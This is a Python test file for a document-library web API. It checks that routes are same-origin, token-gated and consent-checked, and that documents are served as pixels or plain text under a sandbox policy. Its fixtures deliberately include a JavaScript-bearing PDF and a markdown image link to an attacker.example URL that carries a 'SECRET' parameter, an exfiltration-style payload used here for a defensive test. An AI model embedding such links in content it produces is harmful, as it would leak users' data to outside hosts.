"""The Library's routes: owner-only, same-origin, consent-checked on every call,
and nothing a document holds reaches the page except pixels and plain text."""
from __future__ import annotations

import json

import pytest

from tests.library_fixtures import (install_fake_encoder, isolate_library, make_pdf, release_library,
                                    write_docs)


@pytest.fixture(autouse=True)
def _env(tmp_path, monkeypatch):
    fg, lstore = isolate_library(tmp_path, monkeypatch)
    install_fake_encoder(monkeypatch)
    from agent_friday.services.library import runtime, shelf
    monkeypatch.setattr(shelf, "_vault_key", lambda: None)
    monkeypatch.setattr(shelf, "tier_of", lambda title, sample: 1)      # the classifier has its own tests
    monkeypatch.setattr(runtime, "start_background", lambda: None)
    import contextlib
    monkeypatch.setattr(runtime, "gate", lambda stop=None: contextlib.nullcontext())     # no arbiter in a unit test
    yield
    release_library(fg, lstore)


@pytest.fixture(autouse=True)
def _as_the_page(client):
    """Requests arrive the way the Library page sends them: same-origin, with its own Origin."""
    import agent_friday.core as core
    client.environ_base.update({"HTTP_SEC_FETCH_SITE": "same-origin", "HTTP_ORIGIN": "http://localhost",
                                "HTTP_X_FRIDAY_TOKEN": core._API_SESSION_TOKEN})


def _lib(tmp_path):
    root = tmp_path / "Lib"
    write_docs(root, {"lease.pdf": make_pdf([["# Lease", "The tenant shall pay rent monthly."],
                                             ["# Termination", "Either party may end the lease with ninety days notice."]],
                                            javascript=True),
                      "notes.md": "# Notes\n\nGardens and compost.\n\n![x](https://attacker.example/?d=SECRET)\n"})
    return root


def _add(client, root):
    r = client.post("/api/library/add", json={"path": str(root)})
    assert r.status_code == 200, r.get_data(as_text=True)
    from agent_friday.services.library import runtime
    ix = runtime.indexer_for("owner")
    for _ in range(300):
        if not ix.pending():
            break
        import time
        time.sleep(0.1)
    return r.get_json()


def test_routes_are_registered(client):
    rules = {str(r.rule) for r in client.application.url_map.iter_rules()}
    for r in ("/api/library/status", "/api/library/tree", "/api/library/search", "/api/library/add",
              "/api/library/remove", "/api/library/forget", "/api/library/reindex", "/api/library/shelf",
              "/api/library/block/<int:block_id>", "/api/library/page/<int:doc_id>/<int:n>.webp",
              "/api/library/raw/<int:doc_id>"):
        assert r in rules


def test_the_library_starts_empty_and_says_so(client):
    j = client.get("/api/library/status").get_json()
    assert j["empty"] is True and j["counts"]["total"] == 0 and j["scopes"] == []


def test_adding_a_folder_reads_it_and_names_documents_by_title(client, tmp_path):
    root = _lib(tmp_path)
    _add(client, root)
    st = client.get("/api/library/status").get_json()
    assert st["counts"]["indexed"] == 2 and st["scopes"][0]["name"] == "Lib"
    tree = client.get("/api/library/tree?depth=2").get_json()
    kinds = [(n["kind"], n["title"]) for n in tree["nodes"]]
    assert ("folder", "Lib") in kinds and ("document", "Lease") in kinds
    assert str(tmp_path) not in json.dumps(tree) and str(tmp_path) not in json.dumps(st)


def test_a_cross_origin_post_is_refused(client, tmp_path):
    r = client.post("/api/library/add", json={"path": str(_lib(tmp_path))}, headers={"Origin": "http://evil.example"})
    assert r.status_code == 403
    r2 = client.post("/api/library/add", data="x", content_type="text/plain")
    assert r2.status_code == 415


def test_the_observer_has_no_library(client, tmp_path):
    from agent_friday.services import observer_access
    r = client.get("/api/library/status", headers={"X-Friday-Observer": "bogus"})
    assert r.status_code in (401, 403)


def test_search_streams_decisions_then_evidence_then_done(client, tmp_path):
    _add(client, _lib(tmp_path))
    body = client.get("/api/library/search?q=how+much+notice+to+end+the+lease").get_data(as_text=True)
    events = [json.loads(l[6:]) for l in body.split("\n\n") if l.startswith("data: ")]
    names = [e["event"] for e in events]
    assert "decision" in names and names.index("evidence") > names.index("decision") and names[-1] == "done"
    ev = next(e for e in events if e["event"] == "evidence")["evidence"]
    assert ev[0]["doc"] == "Lease" and ev[0]["page"] == 2
    assert events[-1]["receipt"]
    rec = client.get("/api/library/receipt/" + events[-1]["receipt"]).get_json()["receipt"]
    assert rec["menus"] and "ninety" not in json.dumps(rec)


def test_a_block_page_image_and_the_original_are_served_safely(client, tmp_path):
    _add(client, _lib(tmp_path))
    body = client.get("/api/library/search?q=ninety+days+notice").get_data(as_text=True)
    ev = next(json.loads(l[6:]) for l in body.split("\n\n") if l.startswith("data: ") and '"evidence"' in l)["evidence"][0]
    b = client.get("/api/library/block/%d" % ev["block_id"]).get_json()["block"]
    assert b["page"] == 2 and b["bbox"] and len(b["bbox"]) == 4 and "ninety" in b["text"] and b["page_image"]
    img = client.get("/api/library/page/%d/2.webp" % ev["doc_id"])
    assert img.status_code == 200 and img.mimetype in ("image/webp", "image/png")
    assert img.headers["X-Content-Type-Options"] == "nosniff"
    raw = client.get("/api/library/raw/%d" % ev["doc_id"])
    csp = raw.headers["Content-Security-Policy"]
    assert csp.startswith("sandbox") and "default-src 'none'" in csp and raw.headers["Content-Disposition"] == "inline"


def test_a_markdown_document_is_text_never_html(client, tmp_path):
    _add(client, _lib(tmp_path))
    nid = next(n["id"] for n in client.get("/api/library/tree?depth=2").get_json()["nodes"] if n["title"] == "Notes")
    blocks = client.get("/api/library/tree?node=%s&depth=2" % nid).get_json()["nodes"]
    assert blocks
    st = client.get("/api/library/search?q=gardens+compost").get_data(as_text=True)
    ev = next(json.loads(l[6:]) for l in st.split("\n\n") if l.startswith("data: ") and '"evidence"' in l)["evidence"]
    raw = client.get("/api/library/raw/%d" % ev[0]["doc_id"])
    assert raw.mimetype == "text/plain"


def test_removing_a_folder_purges_it_and_forget_needs_a_confirmation(client, tmp_path):
    root = _lib(tmp_path)
    j = _add(client, root)
    r = client.post("/api/library/remove", json={"scope_id": j["scope"]["id"]})
    assert r.get_json()["removed_documents"] == 2
    assert client.get("/api/library/status").get_json()["counts"]["total"] == 0
    assert root.exists()
    j = _add(client, root)
    did = int(next(n["id"] for n in client.get("/api/library/tree?depth=2").get_json()["nodes"]
                   if n["title"] == "Lease")[2:])
    assert client.post("/api/library/forget", json={"doc_id": did}).status_code == 400
    assert client.post("/api/library/forget", json={"doc_id": did, "confirm": True}).get_json()["ok"]
    assert client.get("/api/library/tree?depth=2").get_json()["nodes"][-1]["title"] != "Lease"


def test_a_removed_consent_stops_serving_at_once(client, tmp_path):
    from agent_friday.services.library import grants
    root = _lib(tmp_path)
    j = _add(client, root)
    body = client.get("/api/library/search?q=ninety+days").get_data(as_text=True)
    ev = next(json.loads(l[6:]) for l in body.split("\n\n") if l.startswith("data: ") and '"evidence"' in l)["evidence"][0]
    grants.remove_scope("owner", j["scope"]["id"])
    assert client.get("/api/library/block/%d" % ev["block_id"]).status_code == 404
    assert client.get("/api/library/raw/%d" % ev["doc_id"]).status_code == 404
    assert client.get("/api/library/page/%d/1.webp" % ev["doc_id"]).status_code == 404


def test_the_studio_pdf_routes_and_library_routes_are_both_pixels_only(client):
    rules = {str(r.rule) for r in client.application.url_map.iter_rules()}
    assert "/api/studio-files/pdfpage" in rules and "/api/library/page/<int:doc_id>/<int:n>.webp" in rules


def test_a_request_without_the_session_token_gets_nothing_from_the_library(client):
    client.environ_base.pop("HTTP_X_FRIDAY_TOKEN", None)
    for url in ("/api/library/status", "/api/library/tree", "/api/library/raw/1", "/api/library/page/1/1.webp"):
        assert client.get(url).status_code == 403, url


def test_the_gate_is_told_what_each_change_names(client, tmp_path, monkeypatch):
    from agent_friday.governance import action_gate
    seen = []
    real = action_gate.authorize

    def spy(tool_name, args, session_ctx=None, **kw):
        seen.append((tool_name, dict(args or {}), dict(session_ctx or {})))
        return real(tool_name, args, session_ctx, **kw)

    monkeypatch.setattr(action_gate, "authorize", spy)
    root = _lib(tmp_path)
    j = _add(client, root)
    client.post("/api/library/shelf", json={"doc_id": 1, "shelf": "vault", "confirm": False, "note": "not forwarded"})
    client.post("/api/library/remove", json={"scope_id": j["scope"]["id"]})
    ops = {name: args for name, args, _ctx in seen}
    assert ops["library_add"]["path"] == str(root) or ops["library_add"].get("path")
    assert ops["library_shelf"] == {"doc_id": 1, "shelf": "vault"}, ops["library_shelf"]
    assert ops["library_remove"] == {"scope_id": j["scope"]["id"]}
    assert all(ctx.get("screen_click") is True for _n, _a, ctx in seen)
